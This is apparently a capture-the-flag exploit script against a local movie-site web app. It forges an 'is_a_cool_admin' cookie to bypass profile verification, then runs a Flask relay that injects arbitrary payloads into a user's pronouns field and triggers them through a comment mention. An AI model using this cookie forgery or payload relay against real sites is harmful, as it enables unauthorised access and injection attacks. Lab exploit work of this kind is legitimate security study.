import requests
import random
import sys

from flask import Flask, request

s = requests.Session()
url = "http://localhost:5000/%s"

def register(username, email, password):
    data = {'username':username, \
            'email':email, \
            'password':password}
    response = s.post(url % 'register', data)
    if response.text.find('Registration successful. Welcome !!!') >= 0:
        print("Registered:\n%s:%s:%s" % (username, email, password))


def login(username, password):
    data = {'username':username, \
            'password':password}
    response = s.post(url % 'login', data)
    if response.text.find('Login successful'):
        print("Logged in.")

def find_userid(username):
    print("Please manually find userid: ")
    res = input()
    return int(res)


def get_verified(userid):
    s.cookies.set('is_a_cool_admin', "yes", domain="localhost.local")

    response = s.post(url % 'profile/'+str(userid))
    if response.text.find('Profile verified successfully!') >= 0:
        print("User with userid %s verified." % userid)

def step1(username=None, email=None, password='password'):
    # This step is used only once for the first step of the challenge

    hash = random.getrandbits(128)

    username = "user-%s" % hash
    email = "%s@email.com" % hash

    register(username, email, password)
    login(username, password)
    userid = find_userid(username)
    get_verified(userid)
    # Now the created user is verified
    return username, email, password

# STEP 2

def change_pronoun(email, payload):
    data = {'email':email, \
            'pronouns':payload, \
            'password': ""}

    response = s.post(url % 'profile', data)
    if response.text.find('Profile updated successfully!') >= 0:
        print('Payload sent.')

def send_comment(username):
    data = {'content':"@%s" % username}

    response = s.post(url % 'movie/1', data)
    return response.text
    #Comment added.

def testPayload(email, username, payload):
    change_pronoun(email, payload)
    return send_comment(username)

username, email, password = step1()

app = Flask(__name__)

@app.route("/")
def send_payload():
    payload = request.args.get('payload')
    return testPayload(email, username, payload)

if __name__ == "__main__":

    login(username, password)
    # add clear db button
    app.run(host='0.0.0.0', port=8080)
